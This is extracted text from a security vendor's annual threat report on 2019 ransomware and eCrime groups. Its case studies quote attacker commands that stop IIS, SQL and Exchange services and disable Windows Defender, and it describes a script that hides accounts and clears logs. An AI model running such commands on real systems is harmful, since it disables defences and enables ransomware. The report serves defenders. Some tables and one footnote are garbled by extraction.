This year’s CrowdStrike® Global Threat Report\nprovides clear evidence of that.\n\n###### T Consider the dark turn in cybercrime toward preying on schools, municipal\n\ndepartments and our other chronically understaffed and overburdened public\ninstitutions. This is different from targeting large government entities and corporations,\nmany of whom have resigned themselves to being targeted by cyber predators and\nhave the opportunity to try to protect themselves from that onslaught. It’s a different\nmatter entirely when the targets are schoolchildren, or just ordinary people trying to\ngo about their daily lives.\n\nThis merciless ransomware epidemic will continue, and worsen, as long as the practice\nremains lucrative, and relatively easy and risk-free. We’ve developed a platform\ndesigned to stop ransomware for our customers, and we’ve worked hard to make it\neasy and affordable — even for budget-constrained institutions like our public school\nsystems. As more organizations around the world deploy next-generation platforms\nlike CrowdStrike Falcon® that can prevent these threats, the criminal element will be\nforced to redirect its efforts elsewhere.\n\nWhile criminals are relatively predictable in their tendency to always choose the path\nof least resistance, the activities of nation-states are frequently more relentless and\nsophisticated — and as a result, more challenging for cyberdefenders. This year’s\nthreat report uncovers numerous new tactics, techniques and procedures (TTPs)\nthat state-affiliated threat actors are employing to accomplish their goals. Of concern\nhere is the widening variety of goals these highly capable adversaries may seek to\nachieve. Along with the more traditional objectives of espionage and surveillance have\nbeen added new tasks, such as sowing widespread disruption and discord among\nindividuals, institutions and even whole countries and populations, all in pursuit of\npolitical and economic gains.\n\nIf there’s one thing this year’s Global Threat Report really brings home, it’s that\nthere’s never been a better time to get involved in cybersecurity. The stakes are high,\nand rising every day. Those that read and share this report are helping to educate\nthemselves and others to better protect themselves and their communities, both at\nwork and at home.\n\n**George Kurtz**\nCrowdStrike CEO and Co-Founder\n\n\n-----\n\n###### 2\n\n 4\n 6 7\n\n 8\n 9 10 11 12\n\n\n###### TABLE OF CONTENTS\n\n FOREWORD\n\n INTRODUCTION METHODOLOGY NAMING CONVENTIONS\n\n THREAT LANDSCAPE OVERVIEW: TAKING A STEP BACK FOR PERSPECTIVE MALWARE-FREE ATTACKS BY REGION BREAKOUT TIME GLOBAL ATT&CK TECHNIQUE TRENDS MITRE ATT&CK TECHNIQUES OBSERVED BY OVERWATCH\n\n\n-----\n\n###### INTRODUCTION\n\n\n###### From U.S. school districts to asset management firms, from manufacturing to media, ransomware attacks affected multitudes of people. Disruption in 2019 was not punctuated by a single destructive wiper; rather, it was plagued by sustained operations targeting the underpinnings of our society.\n\n\nyear in cybersecurity is often marked by how disruptive the activity observed\nwas — not just from a destructive standpoint, but also from the perspective of\nwhether day-to-day life was affected. By any such measure, 2019 was an active\nyear. From U.S. school districts to asset management firms, from manufacturing\n\n###### Ato media, ransomware attacks affected multitudes of people. Disruption in 2019 was\n\nnot punctuated by a single destructive wiper; rather, it was plagued by sustained\noperations targeting the underpinnings of our society. The particularly disruptive\nimpact that ransomware had across all sectors is addressed at the beginning of this\nreport, followed by an assessment of additional eCrime threats.\n\nGoing into 2019, CrowdStrike Intelligence anticipated that big game hunting (BGH) —\ntargeted, criminally motivated, enterprise-wide ransomware attacks — was expected\nto continue at least at the 2018 pace. However, what was observed was not just\na continuation but an escalation. Ransom demands grew larger. Tactics became\nmore cutthroat. Established criminal organizations like WIZARD SPIDER expanded\noperations, and affiliates of the ransomware-as-a-service (RaaS) malware developers\nadopted BGH attacks. In short, the greedy got greedier and the rich got richer.\n\nOther criminal actors took note. Numerous adversaries specializing in the delivery or\ndevelopment of malware benefited from supporting customers or partners conducting\nBGH operations. Malware-as-a-service (MaaS) developers like VENOM SPIDER\nintroduced ransomware modules. Banking trojans continued to be repurposed for\ndownload-as-a-service (DaaS) operations — a trend started by MUMMY SPIDER\n— used to distribute malware families associated with BGH. Even targeted eCrime\nappears to be in a state of change, apparent by the recent activity attributed to\nGRACEFUL SPIDER, an adversary notable for its high-volume spam campaigns and\nlimited use of ransomware.\n\nAs in years past, the majority of state-sponsored targeted intrusions appeared to\nbe motivated by traditional intelligence collection needs. Analysis in 2019 revealed\na focus by Chinese adversaries on the telecommunications sector, which could\nsupport both signals intelligence and further upstream targeting. Content related to\n\n\n-----\n\ndefense, military and government organizations remains a popular lure for targeted\nintrusion campaigns. Examples of such incidents were seen in the activity of Russian\nadversaries targeting Ukraine, and the use of defense-themed job and recruitment\ncontent by Iran-based IMPERIAL KITTEN and REFINED KITTEN.\n\nWhile traditional espionage is the primary objective of many state-sponsored actors,\nadversaries associated with the Democratic People’s Republic of Korea (DPRK,\naka North Korea) sustained their interest in cryptocurrencies and the targeting of\nfinancial services, with identified incidents linked to all five named DPRK-associated\nadversaries tracked by CrowdStrike. Exact motives remain unconfirmed, but it is\npossible this interest in financial sector organizations represents additional currency\ngeneration operations and/or industrial espionage. Industrial espionage is also a\nsuspected motive for Vietnam’s targeting of the automotive sector and China’s\ntargeting of healthcare and other sectors, bringing the threat of intellectual property\ntheft back into the spotlight.\n\nIn the following sections, the CrowdStrike Intelligence team, the Falcon OverWatch™\nmanaged threat hunting team and the CrowdStrike Services team present selected\nanalysis that highlights the most significant events and trends in the past year of\ncyber threat activity. This analysis demonstrates how threat intelligence and proactive\nhunting can provide a deeper understanding of the motives, objectives and activities\nof these actors — information that can empower swift proactive countermeasures to\nbetter defend your valuable data now and in the future.\n\n###### Numerous adversaries specializing in the delivery or development of malware benefited from supporting customers or partners conducting BGH operations.\n\n\n-----\n\n###### This report provides a front-line view and greater insight into the cyber battle CrowdStrike's seasoned security experts are waging against today’s most sophisticated adversaries, and offers recommendations for increasing your organization’s cybersecurity readiness.\n\n\n###### METHODOLOGY\n\nThe information in this report was compiled using the following resources:\n\n###### CROWDSTRIKE INTELLIGENCE\n\nThe CrowdStrike Intelligence team provides in-depth and historical understanding of\nadversaries, their campaigns and their motivations. The global team of intelligence\nprofessionals tracks 131 adversaries of all types, including nation-state, eCrime and\nhacktivist actors. The team analyzes TTPs to deliver in-depth, government-grade\nintelligence to enable effective countermeasures against emerging threats.\n\n###### FALCON OVERWATCH\n\nCrowdStrike Falcon OverWatch™ provides proactive threat hunting conducted by a\nteam of experienced threat hunters to deliver 24/7 coverage on behalf of CrowdStrike\ncustomers. In 2019, OverWatch identified and helped stop more than 35,000 breach\nattempts, employing expertise gained from daily “hand-to-hand combat” with\nsophisticated adversaries. The OverWatch team works to identify hidden threat activity\nin customers’ environments, triaging, investigating and remediating incidents in real time.\n\n###### CROWDSTRIKE THREAT GRAPH\n\nAs the brains behind the Falcon platform, CrowdStrike Threat Graph® is a massively\nscalable, cloud-based graph database model custom-built by CrowdStrike. It processes,\ncorrelates and analyzes petabytes of real-time and historical data collected from over 3\ntrillion events per week across 176 countries. The Threat Graph architecture combines\npatented behavioral pattern matching techniques with machine learning and artificial\nintelligence to track the behaviors of every executable across CrowdStrike’s global\ncustomer community. This combination of methodologies enables the identification and\nblocking of previously undetectable attacks, whether or not they use malware.\n\n###### CROWDSTRIKE SERVICES\n\nThis report references the CrowdStrike Services organization and its most recent\n[publication, the \"CrowdStrike Services Cyber Front Lines Report,\" which analyzes](https://www.crowdstrike.com/resources/reports/crowdstrike-services-cyber-front-lines-2020/)\ntrends the Services team observed during its many incident response (IR) investigations\nin 2019. This report provides a front-line view and greater insight into the cyber battle\nthese seasoned security experts are waging against today’s most sophisticated\nadversaries, and offers recommendations for increasing your organization’s\ncybersecurity readiness. In addition to hands-on IR services conducted by its team of\nprofessional investigators, CrowdStrike Services provides proactive services such as\ncybersecurity maturity assessments, IR policy and playbook development, tabletop\nexercises, red teaming operations and compromise assessments. Response and\nremediation services are conducted by highly experienced IR experts who investigate\nbreaches to determine how attackers accessed a client’s environment; mitigate attacks\nand eject intruders; and analyze attacker actions and provide clients with actionable\nguidance to prevent future adversary access.\n\n\n-----\n\n###### NAMING CONVENTIONS\n\nThis report follows the naming conventions instituted by CrowdStrike to categorize\nadversaries according to their nation-state affiliations or motivations (e.g., eCrime or\nhacktivist). The following is a guide to these adversary naming conventions.\n\n###### Adversary Nation-State or Category\n\n\n###### BEAR\n\n BUFFALO\n\n CHOLLIMA\n\n CRANE\n\n JACKAL\n\n KITTEN\n\n LEOPARD\n\n LYNX\n\n PANDA\n\n SPIDER\n\n TIGER\n\n\n###### RUSSIA\n\n VIETNAM\n\n DPRK (NORTH KOREA)\n\n ROK (REPUBLIC OF KOREA)\n\n HACKTIVIST\n\n IRAN\n\n PAKISTAN\n\n GEORGIA\n\n PEOPLE’S REPUBLIC OF CHINA\n\n eCRIME\n\n INDIA\n\n\n-----\n\n###### THREAT LANDSCAPE OVERVIEW:  TAKING A STEP BACK FOR PERSPECTIVE\n\nBefore examining tactics and techniques observed from individual adversaries,\nit’s instructive to take a broad view of the threat landscape and how it continues\nto shift over time. One useful lens is comparing the types of attacks that leverage\nmalware and those that do not. For the purposes of this report, these terms will be\ndefined as follows:\n\n\u0007Malware attacks: These are simple use cases where a malicious file is written to\ndisk, and CrowdStrike Falcon detects the attempt to run that file and then identifies\nand/or blocks it. These intrusion attempts are comparatively simple to intercept and\nblock and can often be stopped effectively with traditional anti-malware solutions.\n\n\u0007Malware-free attacks: CrowdStrike defines malware-free attacks as those in which\nthe initial tactic did not result in a file or file fragment being written to disk. Examples\ninclude attacks where code executes from memory or where stolen credentials\nare leveraged for remote logins using known tools. Malware-free attacks generally\nrequire a wide range of more sophisticated detection techniques to identify and\nintercept reliably, including behavioral detection and human threat hunting.\n\nFigure 1 compares malware and malware-free attacks from the 2019 CrowdStrike\nThreat Graph telemetry.\n\n**Malware-Free** **Malware-Free**\n###### 51% 40%\n 2019 2018\n 49% 60%\n\n**Malware** **Malware**\n\nFigure 1.\n**Global Malware vs. Malware-Free Attacks in 2019 vs. 2018**\n\nThese new data points highlight a continuing trend in attack techniques, which are\nreflected throughout this report. For the last two years, Threat Graph telemetry has\nshown that approximately 60% of attacks were malware-related. The 2019 Threat\nGraph telemetry shows that the trend toward malware-free attacks is accelerating\nwith these types of attacks surpassing the volume of malware attacks.\n\n\n-----\n\n100%\n\n\n###### MALWARE-FREE ATTACKS BY REGION\n\nUsing sample groupings from the CrowdStrike Threat Graph, this year’s report\nincludes the types of activity captured via CrowdStrike global telemetry. The data\naligns with the types of intrusions that are covered elsewhere in this report.\n\n**Malware**\n\nLatin America Europe, Middle East and Africa Indo - Pacific\n\n**Malware-Free**\n\nFigure 2.\n**Malware vs. Malware-Free Intrusions by Region in 2019**\n\nRegional data showed increasing discrepancies in the types of attacks observed\nin different parts of the world. In 2018, all regions showed between 25% and 45%\nmalware-free attacks, whereas 2019 showed a major jump in malware-free attacks\ntargeting North America and a similarly large decrease in malware-free attacks\ntargeting the Latin America region.\n\n|100% 75% 50% 25% 0|Col2|\n|---|---|\n\n\n-----\n\n###### BREAKOUT TIME\n\nIn the 2018 Global Threat Report, CrowdStrike began reporting on \"breakout time.\"\nThis key cybersecurity metric measures the speed from an adversary's initial\nintrusion into an environment, to when they achieve lateral movement across the\nvictim's network toward their ultimate objective. Breakout time is important for\ndefenders, as it sets up the parameters of the continuous race between attackers\nand defenders. By responding within the breakout time window, which is measured\nin hours, defenders are able to minimize the cost incurred and damage done by\nattackers. CrowdStrike continues to encourage security teams to strive to meet the\nmetrics of the 1-10-60 rule: detecting threats within the first minute, understanding\nthreats within 10 minutes, and responding within 60 minutes.\n\nThis year, the average breakout time for all observed intrusions rose from an\naverage of 4 hours 37 minutes in 2018 to 9 hours in 2019. This increase reflects the\ndramatic rise in observed eCrime attacks, which tend to have significantly longer\nbreakout times compared with nation-state adversaries. It’s important to note that\ndefenders should still focus on speed, as data attributable to nation-state activities\nin 2019 does not suggest any major changes in breakout times among stateaffiliated adversaries this year compared to last year.\n\n###### Breakout time is important for defenders, as it sets up the parameters of the continuous race between attackers and defenders. By responding within the breakout time window, which is measured in hours, defenders are able to minimize the cost incurred and damage done by attackers.\n\n\n-----\n\n###### GLOBAL ATT&CK TECHNIQUE TRENDS\n\nMoving past the initial intrusion vector, attackers employed a wide range of tactics\nand techniques in order to achieve their goal, whether that goal was financial gain,\npolitical advantage or disruption of services. The MITRE ATT&CK™ framework\nprovides a very useful taxonomy of attackers’ TTPs that we can use to catalog\nobserved behaviors in order to better understand methods in common use and how\nthose methods have changed over time.\n\n[The MITRE ATT&CK framework is an ambitious initiative that is working to bring](https://attack.mitre.org/)\nclarity to how the industry talks about cyberattacks. It breaks intrusions into a\nseries of 12 tactics that adversaries may employ, each with a number of different\ntechniques that have been observed to be in use.\n\nThe following section delves into the types of techniques CrowdStrike observed in\nits 2019 telemetry and maps them to the ATT&CK framework.\n\n**Scripting**\n**Account Discovery**\n\n**Disabling Security Tools**\n\n**System Owner/User Discovery**\n\n**Registry Run Keys/Start Folder**\n\n**Masquerading**\n\n**Process Injection**\n\n**Hidden Files**\n**and Directories**\n\n###### GLOBAL TECHNIQUES\n\n**PowerShell**\n\n**Command-Line**\n\n**Machine** **Interface**\n**Learning**\n**Malware**\n\n**Credential Dumping**\n\nFigure 3.\n**TTPs Used by Attackers in 2019**\n\n\n-----\n\nA notable change in the most prevalent overall techniques used by attackers in\n2019 was the significant increase in the use of “masquerading.” This uptick can\nbe explained by a rise in the use of the EternalBlue exploit in the wild. This is not\nnecessarily indicative of a particular trend but instead highlights that this is still an\nactive exploit in use by threat actors. For an example of masquerading in action, see\nthe section titled “OverWatch Feature: Targeted RaaS Intrusion Involving REvil” below.\n\nThe remaining techniques mirror those observed in previous years, with heavy\nreliance on hands-on-keyboard techniques (command-line interface, PowerShell) as\nwell as theft of credentials (credential dumping, valid accounts, account discovery)\nand defense evasion (masquerading, hidden files and directories, process injection).\nThese techniques feature prominently in many sophisticated attacks, where a human\nadversary is engaged in the intrusion and is actively working toward an objective.\n\n###### TECHNIQUE SPOTLIGHT_\n\n Masquerading occurs when the name or location of an executable, whether legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.\n\n MITRE ATT&CK TECHNIQUES  OBSERVED BY OVERWATCH\n\nWhen the Falcon OverWatch team analyzes a targeted eCrime or state-sponsored\nintrusion campaign, it uses the MITRE ATT&CK matrix as a framework to\ncategorize adversary behavior. The following chart is a heat map of the adversary\ntactics and techniques OverWatch identified while analyzing targeted eCrime and\nstate-sponsored intrusions in 2019. OverWatch hunters reviewed telemetry from\nall targeted intrusions uncovered by their threat hunting operations to ensure\naccurate identification of the adversary techniques employed.\n\n\n-----\n\nXSL Script Processing\n\nFigure 4.\n**MITRE ATT&CK Heat Map of Tactics and Techniques OverWatch Observed in Targeted Attacks in 2019**\n\n|Initial

2019**\n\n\n-----\n\n###### THE RICH KEEP GETTING RICHER: THE PERVASIVE RANSOMWARE THREAT\n\nIn 2019, BGH, another term for enterprise-scale ransomware operations, was the most\nlucrative enterprise for eCrime adversaries. Ransom demands soared into the millions\n(see Table 1), causing unparalleled disruption.\n\nCrowdStrike Intelligence observed the increasing sophistication of BGH criminal\norganizations attributed to WIZARD SPIDER and INDRIK SPIDER. The latter group\nsplintered to form a new BGH adversary, DOPPEL SPIDER. All of these adversaries\nare well established in the criminal ecosystem. WIZARD SPIDER and INDRIK SPIDER\noperated profitable banking trojans before turning to ransomware to rapidly monetize\ntheir compromise of business and government networks.\n\nRansomware-as-a-service (RaaS)[1] developer PINCHY SPIDER, which takes a cut of\nthe profits from its affiliates, began encouraging partners to adopt BGH practices\nin February 2019. Following a pseudo-retirement — in which PINCHY SPIDER and\nits partners switched from GandCrab to REvil — their use of BGH TTPs became\nincreasingly apparent. The RaaS model of monetization and BGH tactics were also\nadopted by the developers of the Dharma and Nemty ransomware families. Suspected\nBGH and/or RaaS operations include the RobbinHood, LockerGoga, MegaCortex and\nMaze ransomware families. While LockerGoga was only briefly active in 2019, recent\ninfections were reported for the other three in November and December 2019.\n\nUSD BTC Malware\n\n$12.5M ~1,600 Ryuk\n\n$10.9M 565 DoppelPaymer\n\n$10.0M 1,326 REvil\n\n$9.9M 1,250 Ryuk\n\n$6.1M 850 Maze\n\n$6.0M 763 REvil\n\n$5.3M 680 Ryuk\n\n$2.9M 375 DoppelPaymer\n\n$2.5M 250 REvil\n\n$2.5M 250 DoppelPaymer\n\n$2.3M 300 Maze\n\n$1.9M 250 DoppelPaymer\n\n$1.6M 216 BitPaymer\n\n$1.0M 128 Maze\n\nTable 1.\n**Largest Ransom Demands Reported in 2019**\n\n1 R d l ll t di t ib t ( t ) th h t hi Th i t d d fi i l d l th t lit\n\n|USD $12.5M|BTC ~1,600|Malware Ryuk|\n|---|---|---|\n|$10.9M|565|DoppelPaymer|\n|$10.0M|1,326|REvil|\n|$9.9M|1,250|Ryuk|\n|$6.1M|850|Maze|\n|$6.0M|763|REvil|\n|$5.3M|680|Ryuk|\n|$2.9M|375|DoppelPaymer|\n|$2.5M|250|REvil|\n|$2.5M|250|DoppelPaymer|\n|$2.3M|300|Maze|\n|$1.9M|250|DoppelPaymer|\n|$1.6M|216|BitPaymer|\n|$1.0M|128|Maze|\n\n\n-----\n\nAlthough ransomware was widespread in 2019 and affected all sectors, CrowdStrike\nIntelligence identified several trends in the targeting of specific sectors, and in the\nimpacts observed from these targeted operations.\n\nKnown\nSector Details\nRansomware\n\nThe targeting of municipalities and local\ngovernments was popular among BGH criminal\n\nRobbinHood,\n\nLocal Governments operators beginning in Spring 2019 and continuing\n\nRyuk, REvil,\n\nand Municipalities through the rest of the year.

Previously,\nthese campaigns were tracked separately under the cryptonym GRIM SPIDER;\nhowever, beginning in March 2019, evidence coalesced behind the conclusion that\nRyuk campaigns were operated by the core group of WIZARD SPIDER, the wellestablished criminal adversary behind the TrickBot banking trojan.\n\nWIZARD SPIDER continues to develop TrickBot, offering customized modules for\nclose affiliates including LUNAR SPIDER, operator of BokBot. CrowdStrike identified\nnumerous spam campaigns delivering TrickBot using government or business\nthemes, further evidence that this adversary aims to compromise large corporations\nand organizations. As additional support to TrickBot infections, WIZARD SPIDER\nuses Android malware known as AndroStealer to steal SMS messages sent and\nreceived by the device to enable the theft of two-factor authentication (2FA) tokens\nand subsequent financial fraud.\n\nFinally, TrickBot modules are used to identify victims of interest for the deployment\nof WIZARD SPIDER’s post-exploitation tool, Anchor DNS. Often identified on pointof-sale (PoS) endpoints, this piece of malware could enable WIZARD SPIDER to\nconduct financial fraud directly from the victimized systems, without the use of\nwebinjects available in TrickBot or the deployment of ransomware.\n\nWIZARD SPIDER defies any attempts to categorize its operations, having mastered\nmultiple forms and variations of criminal enterprise. The sum total of all of its\noperations has led to WIZARD SPIDER becoming the most reported adversary of\n2019 across all lines of reporting.\n\n###### CrowdStrike identified numerous spam campaigns delivering TrickBot using government or business themes, further evidence that this adversary aims to compromise large corporations and organizations.\n\n\n-----\n\n###### THE WANTED: INDRIK SPIDER\n\nINDRIK SPIDER’s BitPaymer operations continued at pace throughout 2019, and\nCrowdStrike Intelligence also observed the intermittent distribution of Dridex, the\ngroup’s banking trojan. Then, on December 5, 2019, the U.S. Department of Justice\n(DOJ) unsealed an indictment of two Russian individuals — Maksim Viktorovich\nYakubets and Igor Turashev — for their involvement with Bugat malware, which is the\npredecessor of Dridex. Since neither the U.S. nor the U.K. have an extradition treaty\nwith Russia, it is unlikely these individuals will be immediately arrested. However,\nCrowdStrike Intelligence continues to monitor for activity from both Dridex and\nBitPaymer ransomware to identify any possible impact on INDRIK SPIDER, as well as\nthe splinter group DOPPEL SPIDER.\n\n###### THE DOPPELGANGER: DOPPEL SPIDER\n\nIn June 2019, CrowdStrike Intelligence observed a source code fork of BitPaymer\nand began tracking the new ransomware strain as DoppelPaymer. Further technical\nanalysis revealed an increasing divergence between two versions of Dridex, with the\nnew version dubbed DoppelDridex. Based on this evidence, CrowdStrike Intelligence\nassessed with high confidence that a new group split off from INDRIK SPIDER\nto form the adversary DOPPEL SPIDER. Following DOPPEL SPIDER’s inception,\nCrowdStrike Intelligence observed multiple BGH incidents attributed to the group,\nwith the largest known ransomware demand being 250 BTC. Other demands were\nnot nearly as high, suggesting that the group conducts network reconnaissance to\ndetermine the value of the victim organization.\n\n###### INDRIK SPIDER’s BitPaymer operations continued at pace throughout 2019, and CrowdStrike Intelligence also observed the intermittent distribution of Dridex, the group’s banking trojan.\n\n\n-----\n\n###### Ransom demands in REvil operations, compared to PINCHY SPIDER’s former GandCrab operations, have been significantly larger; one of the largest REvil demands identified was for $10 million USD.\n\n\n###### RAAS OPERATIONS  MOVE TOWARD BIG GAME HUNTING\n\n THE PIONEER: PINCHY SPIDER\n\nFirst observed in 2018, PINCHY SPIDER pioneered the RaaS model of operations, in\nwhich the developer receives a share of the profits that affiliates collect from successful\nransomware infections. Beginning in February 2019, this adversary advertised its\nintention to partner with individuals skilled in RDP/VNC networks and with spammers\nwho have experience in corporate networking. Combined with observed hands-on\nactivity by affiliates that resulted in the installation of GandCrab ransomware, this\nindicated a clear intention by PINCHY SPIDER to move toward BGH operations.\n\nIn May 2019, PINCHY SPIDER announced its retirement from GandCrab operations.\nThis development coincided with the rise of REvil ransomware (aka Sodinokibi).\nAnalysis of code overlaps and distribution methods for these two ransomware families\nled to the determination that PINCHY SPIDER had not retired but was operating\nand developing REvil. The decision to announce the retirement of GandCrab on\nforums was possibly due to the public scrutiny and popularity that the operation was\nattracting, which likely included interest by international law enforcement agencies.\n\nUsing REvil, PINCHY SPIDER and its affiliates began BGH operations in earnest.\nRansom demands in REvil operations, compared to PINCHY SPIDER’s former\nGandCrab operations, have been significantly larger; one of the largest REvil demands\nidentified was for $10 million USD. CrowdStrike Intelligence has continued to track\nREvil samples and associated affiliate numbers since mid-2019. As of December\n2019, a total of 699 unique samples of REvil have been identified, as well as 39 unique\naffiliate IDs (see Figure 5).\n\nFigure 5.\n**REvil Sample Count by Affiliate ID and Month in 2019**\n\n\n-----\n\n###### OVERWATCH FEATURE_\n\n\n###### TARGETED RAAS  INTRUSION INVOLVING REVIL\n\n Overview\n\nIn October 2019, OverWatch identified an eCrime intrusion and observed\nmalicious activity reflective of an early-stage hands-on ransomware attack.\nIt involved the retrieval and deployment of multiple actor tools, including a\nmalicious binary identified by CrowdStrike Intelligence as REvil.\n\n###### Initial Observations\n\nThe initial intrusion vector was likely a password-spraying attack against\nRemote Desktop Protocol (RDP) and Server Message Block (SMB) services\nexposed to the internet, allowing the unidentified actor to obtain the necessary\ncredentials to access the network and carry out its actions on objectives.\nOverWatch identified a high volume of failed RDP logon events across multiple\nuser accounts in activity reflective of password spraying, a technique used as an\nalternative to brute forcing where an actor will perform logon attempts against\nmultiple user accounts using a list of commonly used passwords. OverWatch\noften observes this technique prior to targeted ransomware attacks.\n\nThe actor appeared to target both RDP and SMB services on a public-facing\nhost and was ultimately able to successfully guess an account password,\nenabling them to interactively log on to the system, drop tools and execute\ncustom scripts. The password-spraying technique is often preferred over brute\nforcing as it mitigates the possibility of account lockouts that typically occur\nwhen an actor performs multiple failed logon attempts against a single account.\n\n###### Notable Adversary Behavior\n\nIn preparation for the intended execution of the REvil ransomware binary, the\nadversary dropped custom .bat scripts, which upon execution launched\nmultiple net stop and taskkill commands to stop a number of critical\nservices on the host system associated with Microsoft Internet Information\n\n\n-----\n\n###### OVERWATCH FEATURE_\n\n\nServices (IIS), Microsoft SQL Server and Microsoft Exchange.\n\nnet stop IISADMIN\n\nnet stop SQLBrowser\n\nnet stop MSExchangeSA\n\ntaskkill /f /im mysql*\n\nPresumably, these services are stopped in order to unlock their data files to be\nencrypted. Notably, two additional batch files were also written to the host but\nwere not executed. Further analysis of the files suggested that the execution of\nthese scripts would likely have inhibited system recovery via the deletion of volume\nshadow copies, as well as the deletion of system or security logs as a means of\nremoving indicators from the host.\n\nAdditionally, the actor was also observed using the net command to stop the\nWindows Defender service.\n\nnet stop WinDefend\n\nThe actor wrote the REvil binary to the \\Documents directory on the host:\n\nC:\\Users\\user\\Documents\\[REDACTED]\\svhost.exe (sic)\n\nHowever, the adversary was not able to execute the file before the intrusion was\nstopped. Interestingly, the binary appeared to be masquerading as the Windows\nShared Service Host process in a further attempt to evade detection.\n\n###### Conclusions and Recommendations\n\nThe actor’s use of “living off the land” (LOTL) techniques reinforces the importance\nof having humans continuously hunting across a network in order to enable rapid\nresponse to quickly developing threat activity. The deployment of the CrowdStrike\nFalcon agent, complemented with the OverWatch managed threat hunting service,\nallowed for the prompt identification of actor tradecraft and the subsequent\ncontainment and response.\n\nTo defend against password spraying, the use of strong account management — in\nconjunction with effective account lockout policies following a defined number of\nfailed login attempts and the use of complex passwords — can assist in preventing\npasswords from being guessed. In addition, ensure that RDP services are\nappropriately locked down and avoid leaving them exposed to the internet.\n\n\n-----\n\n###### OVERWATCH FEATURE_\n\n\n###### RDP-ENABLED  DHARMA RANSOMWARE ACTIVITY\n\n Overview\n\nCrowdStrike observed numerous attempts by criminal actors to gain access to\nvictim hosts over RDP in order to install RaaS malware families — primarily Dharma,\nbut in at least one case, REvil. The target scope for these incidents is worldwide,\nand they have varied in size from small businesses to Fortune 500 conglomerates.\nCrowdStrike has observed incidents targeting entities in the academic, government,\nhealthcare, hospitality, technology, energy, financial services and manufacturing\nsectors. These attacks are consistent with a move by eCrime adversaries toward\nBGH operations and represent a specific trend observed throughout 2019 of RaaS\naffiliates attempting enterprise ransomware operations.\n\nOverWatch observed an example of such a BGH intrusion in early April 2019\nagainst a large network. The threat actor attempted to deploy ransomware\nknown as Dharma; however, Falcon successfully blocked its execution.\nCrowdStrike Intelligence observed that Dharma has been in use since 2016\nas a direct result of the evolution of the Crysis ransomware. The ransomware\nis highly configurable and operates on an affiliate-based system. Typically for\nthese intrusions, as is the case for many other BGH attacks, the threat actors\ngain access to the systems by exploiting vulnerable machines, or they bruteforce passwords for machines with weak or predictable RDP credentials.\n\n###### Initial Observations\n\nOverWatch identified initial interactive behavior when the adversary executed\na collection of malicious scripts under the Local Administrator account. These\nscripts automated the configuration changes to the system that enabled\npersistent remote access, attempted to execute Dharma ransomware and\nremoved operating system logs.\n\n\n-----\n\n###### OVERWATCH FEATURE_\n\n\n###### Notable Adversary Behavior\n\nThe initial script executed, named Zzz.bat, kicked off the execution of the following tasks:\n\n\u0007Assigned new password for local accounts\n\n\u0007Queried the operating system for users in Local Administrator and Remote\nAccess groups\n\n\u0007Manipulated accounts and user group settings\n\n\u0007Added new user accounts\n\n\u0007Manipulated file system permissions to hide newly added accounts\n\n\u0007Modified registry settings for remote access, disabling connection duration\ntimeout limitations\n\n\u0007Hid newly added accounts from the initial logon screen view\n\n\u0007Created the directory System64Q.dll with additional tools start.cmd, Loog.bat,\nrdpclip.exe (renamed NSSM Service Manager) and payload.exe (Dharma)\n\n\u0007Executed the start.cmd script, which created a new service called\nWindowsSystem set to execute ransomware payload\n\n\u0007Executed the Loog.bat script, which cleared operating system event logs\n\nShortly after, the newly created service WindowsSystem attempted to execute\nthe Dharma ransomware payload; however, the activity was blocked by Falcon.\nIn response, the threat actor downloaded the Process Hacker tool and actively\ndebugged further failed attempts to execute ransomware. After inspecting the\noperating system behavior, the threat actor elevated privileges to target installed\nsecurity software and attempted to disable native operating system features.\n\n###### Conclusions and Recommendations\n\nThe adversary was ultimately unsuccessful in its attack, thanks to the combination\nof Falcon telemetry and OverWatch threat hunting. Nevertheless, this intrusion\nemphasizes the need for successful prevention, rapid detection and timely response\ncapabilities. OverWatch recommends that customers:\n\n\u0007Review current remote access points and ensure that logging is enabled and retained,\nand that access is monitored and restricted to necessary resources only.\n\n\u0007Implement multifactor authentication for all external remote access points, external\napplications and sensitive internal applications within the environment to mitigate the\nrisk of unauthorized access via valid credentials/weak passwords.\n\n\u0007Perform regular scanning for and emergency patching of high-priority vulnerabilities.\n\n\u0007Define a set of emergency procedures that enables security teams to invoke operations\nsuch as host containment, firewall change requests or revocation of account privileges.\n\n\n-----\n\n###### LOOKING FORWARD\n\nIn September 2019, CrowdStrike Intelligence detected and analyzed a previously\nunidentified data exfiltration tool attributed to WIZARD SPIDER, dubbed Sidoh.\nThe functionality of this malware includes the ability to search for keywords within\nfiles, including words related to sensitive information. The nature of these keywords\nsuggests that the adversary could collect data in order to threaten the release of\nsensitive information if ransoms are not paid (i.e., data extortion) or to sell data to\nother adversaries (an additional method of monetization).\n\nAlthough the exact use of Sidoh has not been determined, the list of strings the\ntool uses to select data for exfiltration includes words such as military, secret,\nclandestine and government, raising the question of whether WIZARD SPIDER is\nsupporting government espionage. Interestingly, along with the DOJ indictment of\nINDRIK SPIDER, the U.S. Department of the Treasury’s Office of Foreign Assets\nControl (OFAC) announced sanctions, noting that Yakubets has maintained links to\nand worked for the Russian Federal Security Service (FSB) since 2017. This activity\nincludes items such as \"acquiring confidential documents through cyber-enabled\nmeans and conducting cyber-enabled operations on its behalf.” In 2018, Yakubets\nbegan a process to obtain a license to work on Russian classified information for the\nFSB, which provides further weight to historical evidence of Russia-based eCrime\nactors enabling state activities.\n\nThe increasing threat of data extortion as an alternative method of monetization was\nobserved at the end of 2019, with operators of both REvil and Maze ransomware\nthreatening to leak data, and in some cases following through, if ransoms were\nnot paid. Given these observations, it is possible that data extortion will be used\nincreasingly by these actors to apply additional pressure on victims who don’t pay\nand instead choose to restore their networks using backup copies of the data.\n\n###### The increasing threat of data extortion as an alternative method of monetization was observed at the end of 2019, with operators of both REvil and Maze ransomware threatening to leak data, and in some cases following through, if ransoms were not paid.\n\n\n-----\n\n###### ECRIME TRENDS AND ACTIVITY\n\nIn addition to high-volume ransomware attacks, CrowdStrike Intelligence continued\nto track numerous eCrime threats, including banking trojans, spambots, Business\nEmail Compromise (BEC) scams, targeted eCrime operations, carding shops and\nmalware-as-a-service (MaaS) developers. This section covers notable trends in the\ncybercriminal ecosystem, including observed trends in TTPs and targeting.\n\nThe following figures provide a visual summary of the activity that CrowdStrike\nIntelligence reported on in 2019. Figures 6 and 7 provide a clear indication of the\nlevel of threat ransomware poses. Of all eCrime threats, ransomware represented\n26% of what was reported in 2019. The number climbs to 37% of threats when\nransomware reports are combined with reports of banking trojan malware operated\nby BGH adversaries (e.g., 